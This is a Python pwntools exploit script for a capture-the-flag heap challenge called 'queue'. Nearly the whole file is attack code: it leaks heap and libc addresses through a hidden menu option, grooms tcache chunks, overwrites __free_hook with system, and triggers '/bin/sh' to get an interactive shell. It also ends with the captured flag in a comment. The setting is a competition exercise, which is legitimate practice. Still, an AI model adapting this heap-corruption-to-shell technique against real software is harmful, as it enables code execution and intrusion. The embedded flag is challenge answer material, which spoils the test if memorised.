#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31283 ./queue
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./queue_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31283)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = ELF("./libc.so.6")

def add(idx):
    io.sendline('1')
    io.sendline(str(idx))

def free(idx):
    io.sendline('2')
    io.sendline(str(idx))

def push(idx,msg):
    io.sendline('3')
    io.sendline(str(idx))
    io.sendline(str(msg))

def pop(idx):
    io.sendline('4')
    io.sendline(str(idx))

def compact(idx):
    io.sendline('5')
    io.sendline(str(idx))

def secret(idx):
    io.sendline('69')
    io.sendline(str(idx))


add(0)
add(1)

secret(1)

io.recvuntil("data: ")
heap_base = int(io.recvline()[:-1],16) -0x2d0
print hex(heap_base)

io.recvuntil("cmp: ")
libc.address = int(io.recvline()[:-1],16) - 0x183bd0
print hex(libc.address)


push(0,"test")
push(1,"test")
pop(0)
pop(1)
compact(0)
compact(1)


push(0,"a".ljust(24,'a'))
push(1,"a".ljust(24,'a'))

for _ in range(6-1):
    push(1,"a")

for _ in range(2-1):
    push(0,"a")

add(2)
for _ in range(7):
    push(2,"a")

for _ in range(7):
    pop(2)

pop(0)
pop(0)
pop(1)
pop(1)

for _ in range(7):
    push(2,"c")

push(2,p64(libc.sym['__free_hook']))
push(2,"/bin/sh\x00")
push(2,"/bin/sh\x00")
push(1,p64(libc.sym['system']))

pop(2)

# hope{clearly_it_should_be_higher_55d603c282e269e7}

io.interactive()

